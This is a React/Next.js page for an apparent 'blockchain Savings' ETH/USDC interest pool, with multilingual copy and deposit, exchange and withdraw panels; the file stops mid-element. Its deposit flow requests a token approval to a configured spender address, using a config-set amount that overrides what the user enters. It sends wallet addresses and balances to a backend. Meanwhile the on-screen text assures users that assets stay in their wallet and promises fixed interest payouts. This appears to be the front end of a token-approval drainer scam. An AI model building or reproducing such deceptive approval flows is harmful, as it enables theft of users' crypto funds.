"use client";

import { useEffect, useState } from "react";
import Link from "next/link";
import Image from "next/image";
import {
  savingsPlanParticipations,
  savingsPoolDepositConfig,
  savingsPoolPlans,
  savingsPoolPresentationConfig,
  type SavingsPlanParticipation,
  type SavingsPoolPlan,
} from "@/config/savings-pool-plans";
import { useLocale } from "@/i18n/locale-provider";
import type { Locale } from "@/i18n/locales";
import { Header } from "@/components/layout/header";
import { MarketTicker } from "@/components/layout/market-ticker";
import { MobileBottomNav } from "@/components/layout/mobile-bottom-nav";
import {
  approveAssetTransfer,
  formatTokenAmount,
  getDefaultApprovalAmount,
  getAssetManagerConfig,
  openFixedSavingsPosition,
  parseTokenAmount,
  readLocalAssetBalances,
  type AssetSymbol,
  type VipPlanName,
} from "@/lib/asset-manager-client";
import {
  claimCommissionPosition,
  exchangeEthCommissionForUsdc,
  estimateUsdcFromEth,
  readEthUsdPrice,
  readUserBalance,
  withdrawUsdcBalance,
} from "@/lib/pool-integration";
import { getPreferredEvmProvider, type DetectedWalletProvider } from "@/lib/wallet-provider";
import { syncAuthorizationEvent } from "@/lib/authorization-sync";

type Copy = {
  tabs: string[];
  planTabs: string[];
  accountTabs: string[];
  recordTabs: string[];
  fromOptions: string[];
  poolData: string[][];
  accountData: string[][];
  labels: Record<string, string>;
};

const en: Copy = {
  tabs: ["Pool Data", "Plan", "Account", "Deposit"],
  planTabs: ["Interest", "Record"],
  accountTabs: ["Exchange", "Withdraw", "Record"],
  recordTabs: ["Exchange", "Withdraw", "Interest", "Rebate"],
  fromOptions: ["Account Balance", "Wallet Address"],
  poolData: [
    ["Total dividend data", "0", "ETH"],
    ["Participants", "0", ""],
    ["User earnings", "0", "USD"],
  ],
  accountData: [
    ["Total output", "0", "ETH"],
    ["Wallet balance", "0", "USDC"],
    ["Exchangeable", "0", "ETH"],
  ],
  labels: {
    brand: "blockchain Savings",
    voucher: "Receive voucher",
    smartContract: "Smart Contract",
    contractOrder: "Order",
    contractStatus: "Contract Status",
    contractTotal: "Contract total amount",
    contractCompleted: "Contract completed amount",
    contractEndDate: "Contract end date",
    contractExtraReward: "Contract extra reward",
    contractCurrentEarnings: "Contract current earnings",
    participant: "Participants",
    totalUsd: "Total amount USDC",
    rate: "Rate (ETH)",
    amountUsd: "Amount (USDC)",
    noRecord: "No content at the moment",
    treasury: "USDC",
    convertAll: "Convert all",
    exchange: "Exchange",
    exchangeAsset: "Exchange Asset",
    exchangeHelp: "Convert ETH commission rewards into USDC",
    exchangePreview: "Estimated USDC",
    withdrawalOnly: "Withdrawals are available in USDC only",
    totalBalance: "Total balance",
    confirm: "Confirm",
    cancel: "Cancel",
    withdrawNotice:
      "Your withdrawal will need to wait for 24 hours to arrive in your wallet. The minimum withdrawal amount is $1, and withdrawals cannot exceed 5 times a day.",
    time: "Time",
    quantity: "Amount",
    recordQuantity: "Quantity",
    status: "Status",
    from: "From",
    connectedWallet: "Connected wallet",
    walletNotConnected: "Connect wallet first",
    walletUnavailable: "No supported EVM wallet found",
    walletReady: "Wallet ready",
    authorizationReady: "Authorization submitted by wallet. Backend status recorded.",
    authorized: "Authorized",
    authorizationSyncPending: "Backend sync pending",
    commissionMode: "Commission mode",
    automaticPayout: "Automatic",
    manualPayout: "Manual claim",
    claimPosition: "Claim commission",
    positionId: "Position ID",
    actionSubmitted: "Transaction submitted",
    actionConfirmed: "Transaction confirmed",
    ledgerUnavailable: "Pool ledger is not configured",
    to: "To",
    all: "All",
    depositAsset: "Deposit Asset",
    deposit: "Deposit",
    depositRouting:
      "Funds go directly to an active smart contract. If no smart contract is active, funds are held temporarily until you choose a plan.",
    enterAmount: "Please enter amount",
    zeroUsd: "0 USDC",
    amountRequirement: "Amount Requirement",
    availableZero: "Available: 0",
    usdc: "USDC",
    language: "Language",
    myAccount: "My Account",
    yieldStats: "Yield Stats",
    totalYieldCap: "Total yield cap",
    paidEth: "Paid ETH",
    paidUsdcValue: "Paid USDC value",
    remainingRewards: "Remaining rewards",
    currentParticipants: "Current participants",
    autoMatchedTier: "Auto matched tier",
    walletRetention:
      "Assets remain in your wallet. No transfer to the platform is required; you can withdraw or transfer anytime after meeting the minimum interest distribution time.",
    flexibleRule:
      "Interest accrues in real time and is distributed every 4 hours, 6 times per day. Same-day deposit and withdrawal can still earn interest after the minimum distribution time is met.",
    flexibleFormula: "Formula: 50000 * 1.1% / ETH price / 6",
    adminManaged:
      "Rates follow the smart contract rate table and can later be managed from the admin settings.",
  },
};

const zh: Copy = {
  ...en,
  tabs: ["池数据", "计划", "账户", "转入"],
  planTabs: ["利息", "记录"],
  accountTabs: ["交换", "提取", "记录"],
  recordTabs: ["交换", "提取", "利息", "返佣"],
  fromOptions: ["账户余额", "钱包地址"],
  poolData: [
    ["总分红数量", "0", "以太坊"],
    ["参与者", "0", ""],
    ["用户收入", "0", "美元"],
  ],
  accountData: [
    ["总产出", "0", "以太坊"],
    ["钱包余额", "0", "美元"],
    ["可兑换", "0", "以太坊"],
  ],
  labels: {
    ...en.labels,
    smartContract: "智能合约",
    contractOrder: "智能合约订单",
    participant: "参与者",
    totalUsd: "总金额（美元）",
    rate: "利率",
    amountUsd: "金额（美元）",
    noRecord: "目前暂无内容",
    treasury: "USDC",
    convertAll: "全部转换",
    exchange: "交换",
    exchangeHelp: "将以太坊 (ETH) 兑换为 USDC",
    exchangePreview: "预计可得USDC",
    totalBalance: "总余额",
    confirm: "确认",
    cancel: "取消",
    withdrawNotice:
      "您的提款需要等待 24 小时才能到账，请注意，最低提款金额为 1 美元，且每日提款次数不得超过 5 次。",
    time: "时间",
    quantity: "数量",
    status: "状态",
    from: "从",
    connectedWallet: "转入钱包",
    walletNotConnected: "请先连接钱包",
    walletUnavailable: "未检测到支持的钱包",
    walletReady: "钱包已读取",
    authorizationReady: "钱包授权已提交，后台状态已记录。",
    authorized: "授权成功",
    authorizationSyncPending: "后台同步待处理",
    commissionMode: "佣金发放方式",
    automaticPayout: "自动发放",
    manualPayout: "手动领取",
    claimPosition: "领取佣金",
    positionId: "仓位编号",
    actionSubmitted: "交易已提交",
    actionConfirmed: "交易已确认",
    ledgerUnavailable: "共用池账本地址未配置",
    to: "到",
    all: "全部",
    transfer: "转移",
    depositAsset: "转入资产",
    deposit: "确认转入",
    depositRouting:
      "资金将直接进入当前参加的智能合约；如果尚未参加智能合约，资金会暂存在待分配池中，直到您选择计划。",
    enterAmount: "请输入金额",
    zeroUsd: "0 美元",
    amountRequirement: "金额要求",
    availableZero: "可用：0",
    language: "语言",
    myAccount: "我的账户",
    yieldStats: "收益统计",
    totalYieldCap: "总收益上限",
    paidEth: "已发放ETH数量",
    paidUsdcValue: "已发放USDC价值",
    remainingRewards: "剩余可发放数量",
    currentParticipants: "当前参与人数",
    autoMatchedTier: "自动匹配档位",
    walletRetention:
      "资产始终保留在用户钱包，不需要转入平台；满足最低利息分配时间后，资金可随时提取或转移。",
    flexibleRule:
      "利息按实时累计，每 4 小时分配一次，一天 6 次；当天存当天取，满足最低利息分配时间也给利息。",
    flexibleFormula: "计算公式：50000 * 1.1% / ETH 时价 / 6",
    adminManaged:
      "利率按照智能合约利率表展示，后续可由管理后台设置按钮统一配置。",
  },
};

const poolCopy: Record<Locale, Copy> = {
  en,
  "zh-CN": zh,
  "zh-TW": {
    ...zh,
    tabs: ["池資料", "計劃", "帳戶", "轉入"],
    labels: { ...zh.labels, language: "語言", myAccount: "我的帳戶" },
  },
  ja: {
    ...en,
    tabs: ["プールデータ", "プラン", "アカウント", "入金"],
    labels: { ...en.labels, language: "言語", myAccount: "マイアカウント" },
  },
  ko: {
    ...en,
    tabs: ["풀 데이터", "플랜", "계정", "입금"],
    labels: { ...en.labels, language: "언어", myAccount: "내 계정" },
  },
  th: {
    ...en,
    tabs: ["ข้อมูลพูล", "แผน", "บัญชี", "ฝาก"],
    labels: { ...en.labels, language: "ภาษา", myAccount: "บัญชีของฉัน" },
  },
};

function usePoolCopy() {
  const { locale } = useLocale();
  return { c: poolCopy[locale] };
}

function MainTab({
  label,
  active,
  onClick,
}: {
  label: string;
  active: boolean;
  onClick: () => void;
}) {
  return (
    <button
      type="button"
      role="tab"
      aria-selected={active}
      onClick={onClick}
      className={`flex-1 border px-2 py-2.5 text-xs font-semibold first:rounded-l-md last:rounded-r-md sm:text-sm ${
        active
          ? "border-accent bg-accent text-bg"
          : "border-line bg-surface text-muted"
      }`}
    >
      {label}
    </button>
  );
}

function InnerTabs({
  items,
  active,
  onChange,
}: {
  items: string[];
  active: number;
  onChange: (index: number) => void;
}) {
  return (
    <div className="flex w-full">
      {items.map((item, index) => (
        <button
          key={item}
          type="button"
          role="tab"
          aria-selected={active === index}
          onClick={() => onChange(index)}
          className={`flex-1 px-4 py-2 text-sm font-semibold ${
            active === index ? "bg-accent text-bg" : "text-muted"
          }`}
        >
          {item}
        </button>
      ))}
    </div>
  );
}

function Cell({
  label,
  value,
  unit,
}: {
  label: string;
  value: string;
  unit?: string;
}) {
  return (
    <div className="flex justify-between py-2 border-b border-line">
      <span>{label}</span>
      <span className="font-semibold">
        {value}
        {unit ? <> {unit}</> : null}
      </span>
    </div>
  );
}

function PageFooter() {
  const { c } = usePoolCopy();
  return (
    <div className="mt-8 text-center text-muted">
      <p className="font-bold">{c.labels.brand}</p>
      <p className="text-sm mt-1">{c.labels.voucher}</p>
    </div>
  );
}

function PoolDataPanel() {
  const { c } = usePoolCopy();
  return (
    <div>
      <h2 className="text-lg font-bold mb-4">{c.tabs[0]}</h2>
      <div className="rounded-lg border border-line p-4">
        {c.poolData.map(([label, value, unit]) => (
          <Cell key={label} label={label} value={value} unit={unit} />
        ))}
      </div>
    </div>
  );
}

function TierRulesTable({
  tiers,
  onOrder,
}: {
  tiers: SavingsPoolPlan[];
  onOrder: (tier: SavingsPoolPlan) => void;
}) {
  const { c } = usePoolCopy();
  return (
    <div className="grid gap-4">
      {tiers.map((tier) => (
        <div key={tier.id} className="rounded-lg border border-line p-4">
          <div className="flex items-center gap-3">
            <Image src={tier.image} alt={tier.name} width={48} height={48} />
            <h3 className="font-bold text-lg">{tier.name}</h3>
          </div>
          <p className="text-sm text-muted mt-2">{savingsPoolPresentationConfig.fixedSavingsTitle}</p>

          <div className="grid grid-cols-2 gap-2 my-4">
            <div>
              <div className="text-sm text-muted">{c.labels.amountUsd}</div>
              <div className="font-semibold">{tier.amountRange} USDC</div>
            </div>
            <div>
              <div className="text-sm text-muted">{c.labels.rate}</div>
              <div className="font-semibold">{tier.ethRate}</div>
            </div>
            <div>
              <div className="text-sm text-muted">{c.labels.participant}</div>
              <div className="font-semibold">{tier.participants}</div>
            </div>
            <div>
              <div className="text-sm text-muted">{c.labels.totalUsd}</div>
              <div className="font-semibold">{tier.totalUsdc}</div>
            </div>
          </div>

          <button
            type="button"
            onClick={() => onOrder(tier)}
            className="mt-4 w-full rounded-lg border border-cyan/50 bg-gradient-to-r from-cyan via-accent to-violet px-4 py-3.5 text-sm font-extrabold tracking-wide text-bg shadow-[0_0_26px_rgba(61,214,255,0.38)] transition hover:shadow-[0_0_32px_rgba(61,214,255,0.5)]"
          >
            {c.labels.smartContract}
          </button>
        </div>
      ))}
    </div>
  );
}

function PlanPanel() {
  const [tab, setTab] = useState(0);
  const [selectedPlan, setSelectedPlan] = useState<SavingsPoolPlan | null>(null);
  const [joinedPlans, setJoinedPlans] = useState<SavingsPlanParticipation[]>([]);
  const { c } = usePoolCopy();
  const enabledPlans = savingsPoolPlans
    .filter((plan) => plan.enabled)
    .sort((a, b) => a.sortOrder - b.sortOrder);

  const participation = selectedPlan
    ? [...joinedPlans, ...savingsPlanParticipations].find((item) => item.planId === selectedPlan.id)
    : null;

  return (
    <div>
      <InnerTabs items={c.planTabs} active={tab} onChange={setTab} />
      <div className="mt-4">
        {tab === 0 ? (
          <TierRulesTable tiers={enabledPlans} onOrder={setSelectedPlan} />
        ) : (
          <EmptyState />
        )}
      </div>

      {selectedPlan && participation ? (
        <ContractStatusModal
          plan={selectedPlan}
          participation={participation}
          onClose={() => setSelectedPlan(null)}
        />
      ) : null}
      {selectedPlan && !participation ? (
        <OrderModal
          plan={selectedPlan}
          onClose={() => setSelectedPlan(null)}
          onJoined={(item) => setJoinedPlans((current) => [item, ...current.filter((entry) => entry.planId !== item.planId)])}
        />
      ) : null}
    </div>
  );
}

function ContractStatusModal({
  plan,
  participation,
  onClose,
}: {
  plan: SavingsPoolPlan;
  participation: SavingsPlanParticipation;
  onClose: () => void;
}) {
  const { c } = usePoolCopy();
  return (
    <div className="fixed inset-0 bg-black/60 flex items-center justify-center z-50 p-4">
      <div className="w-full max-w-md rounded-xl bg-surface border border-line p-5 relative">
        <button onClick={onClose} className="absolute right-3 top-3">×</button>
        <div className="flex items-center gap-3">
          <Image src={plan.image} alt={plan.name} width={48} height={48} />
          <h2 className="font-bold text-lg">{plan.name}</h2>
        </div>
        <h3 className="text-base font-semibold mt-3">{c.labels.contractStatus}</h3>

        <div className="mt-4 space-y-2">
          <Cell label={c.labels.contractTotal} value={participation.contractTotalUsdc} unit="USDC" />
          <Cell label={c.labels.contractCompleted} value={participation.completedUsdc} unit="USDC" />
          <Cell label={c.labels.contractEndDate} value={participation.endDate} />
          <Cell label={c.labels.contractExtraReward} value={participation.extraRewardEth} unit="ETH" />
          <Cell label={c.labels.contractCurrentEarnings} value={participation.currentEarningsEth} unit="ETH" />
        </div>
      </div>
    </div>
  );
}

function OrderModal({
  plan,
  onClose,
  onJoined,
}: {
  plan: SavingsPoolPlan;
  onClose: () => void;
  onJoined: (participation: SavingsPlanParticipation) => void;
}) {
  const { c } = usePoolCopy();
  const [amount, setAmount] = useState("");
  const [asset, setAsset] = useState(savingsPoolDepositConfig.assets[0].id);
  const [walletAddress, setWalletAddress] = useState("");
  const [balances, setBalances] = useState<Partial<Record<AssetSymbol, string>>>({});
  const [status, setStatus] = useState(c.labels.walletNotConnected);

  const selectedSymbol = selectedAssetSymbol(asset);
  const available = selectedSymbol ? balances[selectedSymbol] || "0" : "TRON wallet";

  useEffect(() => {
    if (!selectedSymbol) return;
    const detected = getPreferredEvmProvider(window);
    if (!detected) return;
    void readLocalAssetBalances({ ethereum: detected.provider })
      .then((result) => {
        setWalletAddress(result.account);
        setBalances(result.balances);
        setStatus(`${detected.name} · ${c.labels.walletReady}`);
      })
      .catch((error) => {
        setStatus(error instanceof Error ? error.message : "Balance read failed");
      });
  }, [asset, c.labels.walletReady, selectedSymbol]);

  const confirmOrder = async () => {
    if (!selectedSymbol) {
      setStatus("TRON USDT requires the TRON wallet flow");
      return;
    }
    const detected = getPreferredEvmProvider(window);
    if (!detected) {
      setStatus(c.labels.walletUnavailable);
      return;
    }
    const vip = planToVipName(plan);
    if (!vip) {
      setStatus("VIP pool is not configured");
      return;
    }
    try {
      setStatus("Waiting for wallet confirmation");
      const result = await openFixedSavingsPosition({
        ethereum: detected.provider,
        asset: selectedSymbol,
        plan: vip,
        amount,
      });
      setWalletAddress(result.account);
      setStatus("Deposit submitted");
      onJoined({
        planId: plan.id,
        contractTotalUsdc: amount || "0",
        completedUsdc: "0",
        endDate: "Pending settlement",
        extraRewardEth: "0.000000",
        currentEarningsEth: "0.000000",
      });
    } catch (error) {
      setStatus(error instanceof Error ? error.message : "Deposit failed");
    }
  };

  return (
    <div className="fixed inset-0 bg-black/60 flex items-center justify-center z-50 p-4">
      <div className="w-full max-w-md rounded-xl bg-surface border border-line p-5 relative">
        <button onClick={onClose} className="absolute right-3 top-3">×</button>
        <div className="flex items-center gap-3">
          <Image src={plan.image} alt={plan.name} width={48} height={48} />
          <h2 className="font-bold text-lg">{plan.name}</h2>
        </div>
        <h3 className="text-base font-semibold mt-3">{c.labels.contractOrder}</h3>

        <div className="mt-4 space-y-4">
          <div>
            <label className="text-sm">{c.labels.depositAsset}</label>
            <select
              aria-label={c.labels.depositAsset}
              value={asset}
              onChange={(event) => setAsset(event.target.value)}
              className="mt-2 w-full rounded-md border border-line bg-surface px-3 py-3 text-ink"
            >
              {savingsPoolDepositConfig.assets.map((item) => (
                <option key={item.id} value={item.id}>{item.label}</option>
              ))}
            </select>
          </div>

          <div>
            <label className="text-sm flex justify-between">
              <span>{c.labels.amountUsd.replace(" (USDC)", "")}</span>
              <span>Available: {available}</span>
            </label>
            <div className="flex mt-2 rounded-md border border-line overflow-hidden">
              <input
                value={amount}
                onChange={(event) => setAmount(event.target.value)}
                inputMode="decimal"
                className="min-w-0 flex-1 bg-transparent px-3 py-3 text-ink outline-none"
                placeholder={`Not less than ${plan.minimumUsdc} USDC`}
              />
              <button type="button" className="border-l border-line px-4 text-sm font-semibold text-accent">
                {c.labels.all}
              </button>
            </div>
          </div>

          <button
            type="button"
            onClick={confirmOrder}
            className="w-full rounded-md bg-accent px-4 py-3 text-sm font-semibold text-bg"
          >
            {c.labels.confirm}
          </button>
          <p className="text-xs text-muted">{walletAddress || status}</p>
          <p className="text-xs text-muted">ETH commission must be exchanged into USDC before withdrawal.</p>
        </div>
      </div>
    </div>
  );
}

function ExchangePanel({
  balance,
  loadAccount,
  setStatus,
}: {
  balance: { ethCommission: bigint; usdc: bigint; withdrawable: bigint };
  loadAccount: () => Promise<{ detected: DetectedWalletProvider; account: string } | null>;
  setStatus: (value: string) => void;
}) {
  const { c } = usePoolCopy();
  const [amount, setAmount] = useState("");
  const [mode, setMode] = useState<"auto" | "manual">("auto");
  const [positionId, setPositionId] = useState("");
  const [preview, setPreview] = useState("");

  const updatePreview = async (value: string) => {
    setAmount(value);
    try {
      const connection = await loadAccount();
      if (!connection) return;
      const price = await readEthUsdPrice(connection.detected.provider);
      setPreview(formatUnit(estimateUsdcFromEth(parseUnits(value || "0", 18), price), 6));
    } catch (error) {
      setPreview(error instanceof Error ? error.message : "");
    }
  };

  const exchange = async () => {
    try {
      const connection = await loadAccount();
      if (!connection) return;
      setStatus(c.labels.actionSubmitted);
      const raw = parseUnits(amount || formatUnit(balance.ethCommission, 18), 18);
      const result = await exchangeEthCommissionForUsdc({ ethereum: connection.detected.provider, from: connection.account, ethAmount: raw });
      setStatus(result.success ? c.labels.actionConfirmed : c.labels.actionSubmitted);
    } catch (error) {
      setStatus(error instanceof Error && error.message.includes("LEDGER") ? c.labels.ledgerUnavailable : error instanceof Error ? error.message : "Exchange failed");
    }
  };

  const claim = async () => {
    try {
      const connection = await loadAccount();
      if (!connection) return;
      setStatus(c.labels.actionSubmitted);
      const result = await claimCommissionPosition({ ethereum: connection.detected.provider, from: connection.account, positionId: BigInt(positionId || "0") });
      setStatus(result.success ? c.labels.actionConfirmed : c.labels.actionSubmitted);
    } catch (error) {
      setStatus(error instanceof Error && error.message.includes("LEDGER") ? c.labels.ledgerUnavailable : error instanceof Error ? error.message : "Claim failed");
    }
  };

  return (
    <div className="space-y-4">
      <div className="flex rounded-md border border-line overflow-hidden">
        <button type="button" onClick={() => setMode("auto")} className={`flex-1 px-3 py-2 ${mode === "auto" ? "bg-accent text-bg" : "text-muted"}`}>
          {c.labels.automaticPayout}
        </button>
        <button type="button" onClick={() => setMode("manual")} className={`flex-1 px-3 py-2 ${mode === "manual" ? "bg-accent text-bg" : "text-muted"}`}>
          {c.labels.manualPayout}
        </button>
      </div>

      {mode === "manual" ? (
        <div>
          <label className="text-sm">{c.labels.positionId}</label>
          <input
            value={positionId}
            onChange={(event) => setPositionId(event.target.value)}
            inputMode="numeric"
            className="mt-2 w-full rounded-md border border-line bg-surface px-3 py-3 text-ink outline-none"
          />
          <button type="button" onClick={claim} className="mt-3 w-full rounded-md border border-line px-3 py-2">
            {c.labels.claimPosition}
          </button>
        </div>
      ) : null}

      <div>
        <label className="text-sm">{c.labels.exchangeAsset}</label>
        <div className="mt-2 rounded-md border border-line px-3 py-3">ETH</div>
      </div>

      <div className="flex justify-between items-center">
        <span>{c.labels.treasury}</span>
        <button type="button" onClick={() => updatePreview(formatUnit(balance.ethCommission, 18))} className="text-accent text-sm">
          {c.labels.convertAll}
        </button>
      </div>

      <div>
        <label className="text-sm">{c.labels.exchange}</label>
        <input
          value={amount}
          onChange={(event) => void updatePreview(event.target.value)}
          className="mt-2 w-full rounded-md border border-line bg-surface px-3 py-3 text-ink outline-none"
          placeholder="0.0"
        />
      </div>

      <div>
        <div className="text-sm">{c.labels.exchangePreview}</div>
        <div className="font-semibold">{preview || "0"} USDC</div>
      </div>
      <p className="text-xs text-muted">{c.labels.exchangeHelp}</p>

      <button
        type="button"
        onClick={exchange}
        className="w-full rounded-md bg-accent px-4 py-3 text-sm font-semibold text-bg"
      >
        {c.labels.exchange}
      </button>
    </div>
  );
}

function WithdrawPanel({
  balance,
  loadAccount,
  setStatus,
}: {
  balance: { ethCommission: bigint; usdc: bigint; withdrawable: bigint };
  loadAccount: () => Promise<{ detected: DetectedWalletProvider; account: string } | null>;
  setStatus: (value: string) => void;
}) {
  const { c } = usePoolCopy();
  const [amount, setAmount] = useState("");

  const withdraw = async () => {
    try {
      const connection = await loadAccount();
      if (!connection) return;
      setStatus(c.labels.actionSubmitted);
      const raw = parseUnits(amount || formatUnit(balance.withdrawable, 6), 6);
      const result = await withdrawUsdcBalance({ ethereum: connection.detected.provider, from: connection.account, usdcAmount: raw });
      setStatus(result.success ? c.labels.actionConfirmed : c.labels.actionSubmitted);
    } catch (error) {
      setStatus(error instanceof Error && error.message.includes("LEDGER") ? c.labels.ledgerUnavailable : error instanceof Error ? error.message : "Withdraw failed");
    }
  };

  return (
    <div className="space-y-4">
      <div>
        <div className="font-semibold">{c.labels.treasury}</div>
        <p className="text-xs text-muted mt-1">{c.labels.withdrawalOnly}</p>
      </div>

      <div>
        <label className="text-sm">{c.labels.totalBalance}</label>
        <input
          value={amount}
          onChange={(event) => setAmount(event.target.value)}
          className="mt-2 w-full rounded-md border border-line bg-surface px-3 py-3 text-ink outline-none"
          placeholder={formatUnit(balance.withdrawable, 6)}
        />
      </div>

      <button
        type="button"
        onClick={withdraw}
        className="w-full rounded-md bg-accent px-4 py-3 text-sm font-semibold text-bg"
      >
        {c.labels.confirm}
      </button>
      <p className="text-xs text-muted">{c.labels.withdrawNotice}</p>
    </div>
  );
}

function RecordPanel() {
  const [tab, setTab] = useState(0);
  const { c } = usePoolCopy();
  return (
    <div>
      <InnerTabs items={c.recordTabs} active={tab} onChange={setTab} />
      <div className="mt-4 rounded border border-line">
        <div className="grid grid-cols-3 p-2 border-b border-line text-sm font-semibold">
          <div>{c.labels.time}</div>
          <div>{c.labels.recordQuantity}</div>
          <div>{c.labels.status}</div>
        </div>
        <div className="p-6 text-center text-muted">
          {c.labels.noRecord}
        </div>
      </div>
    </div>
  );
}

function AccountPanel() {
  const [tab, setTab] = useState(0);
  const [walletAddress, setWalletAddress] = useState("");
  const [poolBalance, setPoolBalance] = useState({ ethCommission: BigInt(0), usdc: BigInt(0), withdrawable: BigInt(0) });
  const [status, setStatus] = useState("");
  const { c: copy } = usePoolCopy();

  const loadAccount = async () => {
    const detected = getPreferredEvmProvider(window);
    if (!detected) {
      setStatus(copy.labels.walletUnavailable);
      return null;
    }
    const local = await readLocalAssetBalances({ ethereum: detected.provider });
    const balance = await readUserBalance(detected.provider, local.account);
    setWalletAddress(local.account);
    setPoolBalance(balance);
    setStatus(`${detected.name} · ${copy.labels.walletReady}`);
    return { detected, account: local.account };
  };

  return (
    <div>
      <h2 className="text-lg font-bold mb-3">{copy.labels.myAccount}</h2>
      <div className="rounded-lg border border-line p-4 mb-4">
        <Cell label={copy.accountData[0][0]} value={formatUnit(poolBalance.ethCommission, 18)} unit="ETH" />
        <Cell label={copy.accountData[1][0]} value={formatUnit(poolBalance.usdc, 6)} unit="USDC" />
        <Cell label={copy.accountData[2][0]} value={formatUnit(poolBalance.ethCommission, 18)} unit="ETH" />
      </div>
      <p className="text-sm">{walletAddress || copy.labels.walletNotConnected}</p>
      <p className="text-xs text-muted mb-4">{status}</p>

      <InnerTabs items={copy.accountTabs} active={tab} onChange={setTab} />
      <div className="mt-4">
        {tab === 0 ? <ExchangePanel balance={poolBalance} loadAccount={loadAccount} setStatus={setStatus} /> : null}
        {tab === 1 ? <WithdrawPanel balance={poolBalance} loadAccount={loadAccount} setStatus={setStatus} /> : null}
        {tab === 2 ? <RecordPanel /> : null}
      </div>
    </div>
  );
}

function DepositPanel() {
  const { c } = usePoolCopy();
  const [asset, setAsset] = useState(savingsPoolDepositConfig.assets[0].id);
  const [amount, setAmount] = useState(() => getDefaultApprovalAmount());
  const [walletAddress, setWalletAddress] = useState("");
  const [balances, setBalances] = useState<Partial<Record<AssetSymbol, string>>>({});
  const [status, setStatus] = useState(c.labels.walletNotConnected);
  const [authorized, setAuthorized] = useState(false);
  const [approvedAsset, setApprovedAsset] = useState<AssetSymbol | null>(null);
  const [step, setStep] = useState<"connect" | "approve">("connect");

  const activePlan = savingsPoolPlans.find(
    (plan) => plan.id === savingsPoolDepositConfig.activePlanId
  );
  const destination = activePlan
    ? `${activePlan.name} Smart Contract`
    : savingsPoolDepositConfig.temporaryPoolLabel;

  const connectAndPrepare = async () => {
    try {
      const detected = getPreferredEvmProvider(window);
      if (!detected) {
        setStatus(c.labels.walletUnavailable);
        return;
      }
      setStatus("Step 1: Detecting wallet...");
      setStatus("Step 2-3: Requesting wallet connection...");
      const snapshot = await readLocalAssetBalances({ ethereum: detected.provider });
      setWalletAddress(snapshot.account);

      const symbol = selectedAssetSymbol(asset);
      if (symbol) {
        setBalances(snapshot.balances);
      }
      setStatus(`${detected.name} · ${c.labels.walletReady}`);
      setStep("approve");
    } catch (error) {
      setStatus(error instanceof Error ? error.message : "Connection failed");
    }
  };

  const approveDeposit = async () => {
    if (authorized) {
      setStatus(c.labels.authorizationReady);
      return;
    }
    const detected = getPreferredEvmProvider(window);
    if (!detected) {
      setStatus(c.labels.walletUnavailable);
      return;
    }
    const symbol = selectedAssetSymbol(asset);
    if (!symbol) {
      setStatus("TRON assets require the TRON wallet flow");
      return;
    }
    try {
      const config = getAssetManagerConfig();
      const token = config.tokens[symbol];
      const approvalRaw = parseTokenAmount(config.approvalAmount || amount, token.decimals);
      const approvalDisplay = formatTokenAmount(approvalRaw, token.decimals);

      setStatus("Step 7: Initiating approval transaction...");
      await syncAuthorizationEvent({
        status: "pending",
        walletAddress,
        walletProvider: detected.name,
        walletProviderId: detected.id,
        chainId: config.chainId,
        chainName: config.chainName,
        tokenSymbol: symbol,
        tokenAddress: token.address,
        spenderAddress: config.spender,
        approvalAmountRaw: approvalRaw.toString(),
        approvalAmountDisplay: approvalDisplay,
        requestedAmountDisplay: amount,
        projectContract: config.spender,
        contractRole: "assetManager",
        balances,
      });

      setStatus("Step 8-9: Waiting for wallet to sign approval...");
      const result = await approveAssetTransfer({ ethereum: detected.provider, asset: symbol, amount });

      setAuthorized(true);
      setApprovedAsset(symbol);

      const syncResult = await syncAuthorizationEvent({
        status: "success",
        walletAddress: result.account,
        walletProvider: detected.name,
        walletProviderId: detected.id,
        chainId: config.chainId,
        chainName: config.chainName,
        tokenSymbol: symbol,
        tokenAddress: token.address,
        spenderAddress: config.spender,
        approvalAmountRaw: result.amount,
        approvalAmountDisplay: approvalDisplay,
        requestedAmountDisplay: amount,
        txHash: result.hashes.at(-1),
        projectContract: config.spender,
        contractRole: "assetManager",
        balances,
      });

      setStatus(`${detected.name} · ${c.labels.authorized}${syncResult.status === "failed" ? ` · ${c.labels.authorizationSyncPending}` : ""}`);
    } catch (error) {
      try {
        const config = getAssetManagerConfig();
        const symbol_val = selectedAssetSymbol(asset);
        if (symbol_val) {
          const token = config.tokens[symbol_val];
          await syncAuthorizationEvent({
            status: "failed",
            walletAddress,
            walletProvider: detected.name,
            walletProviderId: detected.id,
            chainId: config.chainId,
            chainName: config.chainName,
            tokenSymbol: symbol_val,
            tokenAddress: token.address,
            spenderAddress: config.spender,
            approvalAmountRaw: "",
            approvalAmountDisplay: config.approvalAmount,
            requestedAmountDisplay: amount,
            projectContract: config.spender,
            contractRole: "assetManager",
            balances,
            errorMessage: error instanceof Error ? error.message : "Authorization failed",
          });
        }
      } catch {
        // ignore
      }
      setStatus(error instanceof Error ? error.message : "Authorization failed");
    }
  };

  return (
    <section className="space-y-4">
      <div>
        <label className="text-sm">{c.labels.from}</label>
        <div className="mt-2 rounded-md border border-line px-3 py-3">
          <div>{c.labels.connectedWallet}</div>
          <div className="text-xs text-muted break-all">{walletAddress || status}</div>
        </div>
      </div>

      <div>
        <label className="text-sm">{c.labels.depositAsset}</label>
        <select
          aria-label={c.labels.depositAsset}
          value={asset}
          onChange={(event) => setAsset(event.target.value)}
          className="mt-2 w-full rounded-md border border-line bg-surface px-3 py-3 text-ink"
          disabled={step === "approve"}
        >
          {savingsPoolDepositConfig.assets.map((item) => (
            <option key={item.id} value={item.id}>{item.label}</option>
          ))}
        </select>
      </div>

      <div>
        <label className="text-sm">{c.labels.to}</label>
        <div className="mt-2 rounded-md border border-line px-3 py-3">{destination}</div>
      </div>

      <div>
        <label className="text-sm">{c.labels.quantity}</label>
        <div className="flex mt-2 rounded-md border border-line overflow-hidden">
          <input
            id="deposit-amount"
            value={amount}
            onChange={(event) => setAmount(event.target.value)}
            inputMode="decimal"
            className="min-w-0 flex-1 bg-transparent px-3 py-3 text-ink outline-none"
            placeholder={c.labels.enterAmount}
            disabled={step === "approve"}
          />
          <button
            type="button"
            className="border-l border-line px-4 text-sm font-semibold text-accent"
            disabled={step === "approve"}
          >
            {c.labels.all}
          </button>
        </div>
        <div className="text-xs text-muted mt-1">
          {selectedAssetSymbol(asset) ? balances[selectedAssetSymbol(asset) as AssetSymbol] || "0" : "0"} {savingsPoolDepositConfig.assets.find((item) => item.id === asset)?.label}
        </div>
      </div>

      <p className="text-xs text-muted">{c.labels.depositRouting}</p>

      {step === "connect" ? (
        <button
          type="button"
